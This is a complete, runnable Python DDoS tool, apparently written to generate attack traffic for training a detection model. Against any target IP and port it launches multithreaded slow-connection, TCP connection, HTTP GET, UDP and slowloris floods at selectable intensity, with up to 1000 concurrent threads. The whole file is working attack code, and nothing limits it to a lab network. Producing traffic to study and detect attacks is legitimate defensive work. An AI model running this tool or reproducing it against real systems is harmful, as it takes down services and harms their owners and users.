import socket
import threading
import time
import random
import argparse
import sys
from datetime import datetime
import os

# Set a standard logging function for container visibility
def log_message(level, message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}][{level}] {message}")

class RealisticDDoSAttacker:
    """
    Generates DDoS traffic patterns that match real-world training data.
    """
    
    def __init__(self, target_ip, target_port=80):  # Changed default port to 80
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.threads = []
        self.stats = {
            'packets_sent': 0,
            'connections_made': 0,
            'errors': 0,
            'start_time': None
        }
        self.lock = threading.Lock()
        
    def dataset_mimic(self, duration=120, intensity='high'):
        """
        [MODIFIED] Dataset Mimic Attack
        Replicates DDos.csv patterns: Small PSH packets, Slow rates, but with HIGH concurrency.
        """
        log_message("INFO", f"\n{'='*70}")
        log_message("INFO", f"🔴 Starting DATASET MIMIC Attack (Intensity: {intensity.upper()})")
        log_message("INFO", f"   Target: {self.target_ip}:{self.target_port}")
        log_message("INFO", f"   Duration: {duration}s")
        log_message("INFO", f"{'='*70}\n")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        # INCREASED CONCURRENCY for high intensity to ensure detection
        if intensity == 'low':
            num_threads = 50
        elif intensity == 'medium':
            num_threads = 200
        else:  # high
            num_threads = 1000  # Increased to 1000 for more flows/packets
            
        def worker():
            while self.running and (time.time() - self.stats['start_time']) < duration:
                sock = None
                try:
                    # 1. Establish connection (SYN, SYN-ACK, ACK)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3.0)
                    sock.connect((self.target_ip, self.target_port))
                    
                    with self.lock:
                        self.stats['connections_made'] += 1
                        # Account for initial 3-way handshake packets
                        self.stats['packets_sent'] += 3 

                    # 2. Maintain connection and send small chunks
                    while self.running and (time.time() - self.stats['start_time']) < duration:
                        # Dataset Match: Fwd Packet Length Mean ~ 7.5 bytes (Range 6-20)
                        payload_len = random.randint(6, 20)
                        payload = os.urandom(payload_len) 
                        
                        try:
                            # Sending data triggers the PSH flag
                            sock.send(payload) 
                            
                            with self.lock:
                                self.stats['packets_sent'] += 1
                            
                            # Dataset Match: Wait ~1.6s average (randomized 0.5 to 2.5)
                            time.sleep(random.uniform(0.5, 2.5))
                            
                        except (BrokenPipeError, ConnectionResetError, socket.error):
                            # Connection was closed by the target or intermediate network
                            break
                            
                except Exception as e:
                    with self.lock:
                        self.stats['errors'] += 1
                finally:
                    if sock:
                        try:
                            sock.close()
                        except:
                            pass
                    # If connection broke, wait briefly before reconnecting
                    time.sleep(random.uniform(0.1, 0.5)) # Wait before trying a new connection
        
        log_message("INFO", f"✓ Launching {num_threads} mimic threads...")
        for i in range(num_threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)
            time.sleep(0.005) # Stagger start slightly
            
        self._monitor_attack(duration)

    def syn_flood(self, duration=120, intensity='medium'):
        """SYN Flood Attack - Good alternative for high-volume detection"""
        log_message("INFO", f"\n{'='*70}")
        log_message("INFO", f"🔴 Starting SYN FLOOD Attack")
        log_message("INFO", f"   Target: {self.target_ip}:{self.target_port}")
        log_message("INFO", f"{'='*70}\n")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        # Increase threads for the 'high' setting
        if intensity == 'low': num_threads = 20; delay = (0.1, 0.3)
        elif intensity == 'medium': num_threads = 50; delay = (0.05, 0.15)
        else: num_threads = 200; delay = (0.001, 0.01) # Very high concurrency, low delay
        
        def worker():
            while self.running and (time.time() - self.stats['start_time']) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1) # Short timeout prevents 3-way completion
                    sock.connect((self.target_ip, self.target_port))
                    with self.lock:
                        self.stats['connections_made'] += 1
                        self.stats['packets_sent'] += 1 # Only SYN sent (no FIN/RST or data)
                    # Importantly, DON'T close the socket immediately, let it time out
                except:
                    with self.lock: self.stats['errors'] += 1
                finally:
                    # Closing the socket gracefully is less like a true half-open flood
                    # but leaving them open can deplete local resources. 
                    # We rely on the short timeout and continuous attempts.
                    try:
                        sock.close()
                    except:
                        pass
                time.sleep(random.uniform(*delay))

        log_message("INFO", f"✓ Launching {num_threads} SYN flood threads...")
        for _ in range(num_threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)
            time.sleep(0.01)
        self._monitor_attack(duration)

    def http_flood(self, duration=120, intensity='medium'):
        """HTTP Flood Attack (Unchanged from your version)"""
        log_message("INFO", f"\n{'='*70}")
        log_message("INFO", f"🔴 Starting HTTP FLOOD Attack")
        log_message("INFO", f"   Target: {self.target_ip}:{self.target_port}")
        log_message("INFO", f"{'='*70}\n")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        if intensity == 'low': num_threads = 5
        elif intensity == 'medium': num_threads = 20
        else: num_threads = 100
        
        user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)']

        def worker():
            while self.running and (time.time() - self.stats['start_time']) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2.0)
                    sock.connect((self.target_ip, self.target_port))
                    with self.lock: self.stats['connections_made'] += 1
                    
                    # Keep requesting on same connection
                    for _ in range(random.randint(5, 50)):
                        if not self.running: break
                        request = f"GET /?{random.randint(1,9999)} HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: {random.choice(user_agents)}\r\n\r\n"
                        sock.send(request.encode())
                        with self.lock: self.stats['packets_sent'] += 1
                        time.sleep(random.uniform(0.05, 0.2))
                except:
                    with self.lock: self.stats['errors'] += 1
                    time.sleep(0.1)
                finally:
                    try: sock.close()
                    except: pass

        for _ in range(num_threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)
        self._monitor_attack(duration)

    def udp_flood(self, duration=120, intensity='medium'):
        """UDP Flood Attack (Unchanged from your version)"""
        log_message("INFO", f"\n{'='*70}")
        log_message("INFO", f"🔴 Starting UDP FLOOD Attack")
        log_message("INFO", f"   Target: {self.target_ip}:{self.target_port}")
        log_message("INFO", f"{'='*70}\n")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        if intensity == 'low': num_threads = 5
        elif intensity == 'medium': num_threads = 20
        else: num_threads = 50
        
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.running and (time.time() - self.stats['start_time']) < duration:
                try:
                    payload = os.urandom(1024) # 1KB Packet
                    sock.sendto(payload, (self.target_ip, self.target_port))
                    with self.lock: self.stats['packets_sent'] += 1
                    time.sleep(random.uniform(0.01, 0.1))
                except:
                    with self.lock: self.stats['errors'] += 1
            sock.close()

        for _ in range(num_threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)
        self._monitor_attack(duration)

    def slowloris(self, duration=120, num_connections=50):
        """Slowloris Attack (Unchanged from your version)"""
        log_message("INFO", f"\n{'='*70}")
        log_message("INFO", f"🔴 Starting SLOWLORIS Attack")
        log_message("INFO", f"   Target: {self.target_ip}:{self.target_port}")
        log_message("INFO", f"{'='*70}\n")
        self.running = True
        self.stats['start_time'] = time.time()
        
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5.0)
                sock.connect((self.target_ip, self.target_port))
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                sock.send(f"User-Agent: Mozilla/5.0\r\n".encode("utf-8"))
                sock.send(f"Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
                
                with self.lock:
                    self.stats['connections_made'] += 1
                
                while self.running and (time.time() - self.stats['start_time']) < duration:
                    # Send keep-alive header
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                    with self.lock: self.stats['packets_sent'] += 1
                    time.sleep(random.uniform(2, 5)) # Slow wait
            except:
                with self.lock: self.stats['errors'] += 1
            finally:
                 try: sock.close()
                 except: pass
                
        for _ in range(num_connections):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)
            time.sleep(0.1)
        self._monitor_attack(duration)

    def _monitor_attack(self, duration):
        start_time = self.stats['start_time']
        try:
            while self.running and (time.time() - start_time) < duration:
                elapsed = time.time() - start_time
                with self.lock:
                    packets = self.stats['packets_sent']
                    conns = self.stats['connections_made']
                # Updated print for better visibility in Docker console
                print(f"\r📊 ATTACK IN PROGRESS | Time: {elapsed:.0f}s/{duration}s | Pkts: {packets:,} | Conns: {conns:,} | Errors: {self.stats['errors']:,}", end="", flush=True)
                time.sleep(1)
            print(f"\r📊 ATTACK FINISHED | Total Pkts: {self.stats['packets_sent']:,} | Total Conns: {self.stats['connections_made']:,} | Total Errors: {self.stats['errors']:,}")
        except KeyboardInterrupt:
            print("\nAttack stopped by user.")
        self.stop()

    def stop(self):
        self.running = False
        for t in self.threads:
            t.join(timeout=1)

def main():
    parser = argparse.ArgumentParser(description='Docker DDoS Attack Simulator')
    parser.add_argument('--target', required=True, help='Target IP')
    parser.add_argument('--port', type=int, default=80, help='Target Port')  # Changed default to 80
    parser.add_argument('--type', choices=['syn', 'http', 'udp', 'slowloris', 'dataset_mimic'], default='dataset_mimic', help='Attack Type')
    parser.add_argument('--duration', type=int, default=120, help='Duration (s)')
    parser.add_argument('--intensity', choices=['low', 'medium', 'high'], default='medium', help='Intensity')
    parser.add_argument('--connections', type=int, default=50, help='Connections for slowloris')
    
    args = parser.parse_args()
    
    attacker = RealisticDDoSAttacker(args.target, args.port)
    
    if args.type == 'dataset_mimic':
        attacker.dataset_mimic(args.duration, args.intensity)
    elif args.type == 'syn':
        attacker.syn_flood(args.duration, args.intensity)
    elif args.type == 'http':
        attacker.http_flood(args.duration, args.intensity)
    elif args.type == 'udp':
        attacker.udp_flood(args.duration, args.intensity)
    elif args.type == 'slowloris':
        attacker.slowloris(args.duration, args.connections)

if __name__ == "__main__":
    main()